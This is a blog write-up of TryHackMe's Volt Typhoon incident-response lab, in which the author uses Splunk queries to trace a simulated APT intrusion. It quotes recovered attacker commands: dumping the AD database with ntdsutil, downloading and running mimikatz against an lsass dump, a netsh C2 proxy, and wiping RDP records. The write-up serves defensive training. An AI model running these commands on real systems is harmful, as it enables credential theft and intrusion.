---
title: Volt Typhoon Lab
description: Comprehensive write-up to TryHackMe's Volt Typhoon Lab.
date: 2025-12-12
tags:
  - Incident Response
  - APT
  - SOC
  - Splunk
featured: false
draft: false
image: https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1741966741588
---

## Scenario 
In this lab, I assume the role of a Security Analyst responding to a suspected intrusion. TryHackMe states that the intrusion is carried out by the notorious APT group, Volt Typhoon. 

*Throughout this lab, we will analyze logs through each phase of the kill chain from initial access to C2 communications.*


## Who is Volt Typhoon?

According to [MITRE](https://attack.mitre.org/groups/G1017/), Volt Typhoon is a China state-sponsored threat actor that has been active since 2021. Volt Typhoon is known for targeting critical U.S infrastructure, and for their stealthy LotL techniques for evading detections.

## Initial Access

The log source defined in this lab is "ADSelfServicePlus" logs which are ingested in Splunk.


### Account Compromise 
1. Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?

With the information available to us, we can identify deans username through the username field listed under "interesting fields", presenting deans username as "dean-admin".



![query](https://i.imgur.com/l3InBz6.png)


2. Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?

To find out the type of action an account creation would fall under, we can list the action_name events, which lists "Enrollment".

![action_name_enrollment](https://i.imgur.com/sVM87xI.png) 

![results](https://i.imgur.com/M81flAd.png)

### Persistence

Querying on this produces 4 results, and cross-referencing with the timestamp of the `dean-admin` account takeover, we can find that a new admin account was created as `voltyp-admin`. As dean's inital account that was comprimised had Administrator rights, Volt Typhoon created their new admin account to further achieve persistence and elevate privileges.

## Execution

As noted before, Volt Typhoon is known for their Windows Managmenent Instrumentation Command-Line (WMIC) for a range of execution techniques, ranging from information gathering to dumping databases. Through these LotL techniques, it makes detection more challenging.

3. In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?

At this point, we have confirmed that the two user accounts `dean-admin` and `voltyp-admin` are compromised. Knowing this, we can query for a wildcard text search on `server02` to gain more information on the WMIC command being run.

![wmic-infogathering](https://i.imgur.com/vHixv9m.png)

### OS Credential Dumping: NTDS

```bash
wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename	
```

By performing a query on `ntdsutil`, an Active Directory tool, we can identify another suspicious wmic command creating a temp directory, and writing a copy of the Active Directory database to the tmp directory under the filename `temp.dit`.

### Data Exfiltration

```pwsh
wmic process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp 
& ntdsutil.exe \"ac i ntds\" \"ifm create full C:\Windows\Temp\tmp\temp.dit"" | executed | success |
```

Breaking this command down, `wmic process call create cmd.exe /c mkdir C:\Windows\Temp\tmp` creates a new directory in the Temp folder.

Followed by `ntdsutil.exe`:
- `ac i ntds`: actives NTDS (Active Directory database) instance
- `ifm create full`: attempts to create a full copy of the Active Directory database (NTDS.dit)
    - contains user account information, password hashes (NT), group security policies and memberships


4. The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?

Previously, the Active Directory copy was named `temp.dit`, knowing this we can further track this file by querying on the AD database copy.

![temp.dit](https://i.imgur.com/cB0hpbv.png)

By following the `temp.dit` file, we can identify 3 events.

We can see that after the Active Directory database copy was taken, it copied over to the `wwwroot` directory on `webserver-01`, prepping the database copy for data exfiltration through the following command: 

```pwsh
wmic /node:webserver-01 process call create “cmd.exe /c xcopy C:\Windows\Temp\tmp\temp.dit \\webserver-01\c$\inetpub\wwwroot”
```

Followed by obfuscating the file name to blend in with legitimate network files, and password-protecting the zip contents to likely avoid the content from being scanned, and splits it into 100mb volumes to avoid file size detection.

```cmd
wmic /node:webserver-01 process call create “cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit”
```

## Persistence

5. To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed?

```spl
index="main" C:\\Windows\\Temp\\
| sort _time asc
```

### Web Shell Creation

As the attacker has had presence in the `C:\Windows\Temp` folder, this was the first place I checked, utilizing the query above. Sure enough, we can identify PowerShell pipeline execution with b64 encoded text.

![b64-encoded](https://i.imgur.com/1CV1DHJ.png)

To decode this text, I utilized [CyberChef](https://gchq.github.io/CyberChef/). Decoding the base64 shows a C# script to create a webshell on the file `ntuser.ini`.

![webshell-creation](https://i.imgur.com/7YH9GE0.png)

## Defense Evasion

5. In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?

Doing some research, the `Remove-ItemProperty` is commonly used to remove "Most Recently Used" records in the registry, thus returning 3 events for removing registry keys.

![remove-itemproperty](https://i.imgur.com/s5xzHUy.png)

6. The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?

The previous archive, which was a `.7z` file, stored the Active Directory database data, querying on this file, the APT renamed the file to `cl64.gif` from `cisco-up.7z`.

```powershell
wmic /node:webserver-01 process call create "cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif"
```
### Information Gathering

7. Under what regedit path does the attacker check for evidence of a virtualized environment?

Knowing that a virtualized environment registry key would fall under the HKLM hive, I queried for HKLM registry keys and was able to discover a powershell command execution to gather information regarding the systems virtualization. 
```powershell
Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*
```

![virtualized-reg](https://i.imgur.com/YOfvRHJ.png)

## Credential Access

8. Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate?

Knowing that they used reg query, to further gather information about the software installed on the system, we can query on reg query to identify any command execution containing reg query.

Doing so, returns 8 events, where the APT identifies OpenSSH, RealVNC, PuTTY, and also the current Windows version.

9. What is the full decoded command the attacker uses to download and run mimikatz?

Earlier to download the webshell, the APT used base64 encoding in the powershell execution, so knowing that information, I can run a base64 encoding on the word "Mimikatz" and use that as a wildcard search in Splunk.

Mimikatz --base64--> bWltaWthdHo=

As this can differ slightly depending on surroudning characters, I will use "bWltaW" in my wildcard query.

Suprisingly, this returned 1 event.

![mimikatz-b64](https://i.imgur.com/4OB7OGc.png)

Decoding the b64 encoded command:
```powershell
Invoke-WebRequest -Uri "http://[redacted]/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```

## Discovery & Lateral Movement

10. The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?

Querying on the key word "wevtutil", returns 12 events, combing through the command execution line, the attacker is looking at event IDs 4624 4625 4769.

11. Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?

The original web shell was named `ntuser.ini`, so querying on this file name, reveals an event where the certutil tool is used to decode the original base64 encoded file, and naming it `iisstart.aspx`, however when moving laterally to server-02, the file name is changed.

```powershell
certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx`
```

![renaming](https://i.imgur.com/09NiHFe.png)

As the attacker moves laterally to server-02, the file name of the webshell changes to AuditReport.jspx.

## Collection

12. The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?

At some point, I recall seeing a log related to finance data, however I cant remember which query this was under. So, I'll try a wildcard search on `finance`.

![datacompromise-finance](https://i.imgur.com/BcpG1OW.png)

The events returned reveal sensitive financial data compromise to `2022.csv, 2023.csv, 2024.csv`.

## C2 Communications

13. The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?

Using netsh as a keyword, we can identify 4 events containing netsh usage.

![c2setup](https://i.imgur.com/IjZFFGr.png)

One of the events contains the command:

```powershell
wmic /node: server-01 /user: dean-admin /password: uNcr4cK4b1e process call create “cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=8443 connectaddress=10.2.30.1”
```

So we can identify a C2 communication to IP address `10.2.30.1` over port `8443`. 

14. To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?

By reviewing the wevtutil utility usage, I was able to identify removal for the following types of logs: Application Security Setup System.

## Closing Thoughts

This was one of my favorite labs so far, it really engaged me and allowed me to create an attack timeline throughout my head and keep an idea on what the APT may be trying to do. Overall, this really helped me think like a threat hunter and develop key skills through Splunk.
